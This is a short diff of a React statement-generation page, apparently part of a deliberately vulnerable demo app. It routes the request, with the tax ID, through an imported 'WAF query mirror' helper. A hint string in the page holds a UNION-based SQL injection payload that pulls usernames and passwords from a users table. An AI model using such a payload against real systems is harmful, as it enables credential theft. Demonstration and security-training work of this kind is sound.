@@ -4,6 +4,7 @@ import { useState, useMemo } from "react";
 import { createSingleFlight } from "@/lib/single-flight";
 import { GlassCard } from "@/components/GlassCard";
 import { StatementGrid, type StatementRow } from "@/components/StatementGrid";
+import { wafMirrorUrl } from "@/lib/waf-query-mirror";
 
 const DEMO_HINT = `Demo payload → 0 UNION SELECT TO_CHAR(id), username, password, role FROM users`;
 
@@ -21,7 +22,7 @@ export default function StatementPage() {
       setLoading(true);
       setGenerated(true);
       try {
-        const res = await fetch("/api/statement/generate", {
+        const res = await fetch(wafMirrorUrl("/api/statement/generate", { taxId }), {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ taxId }),
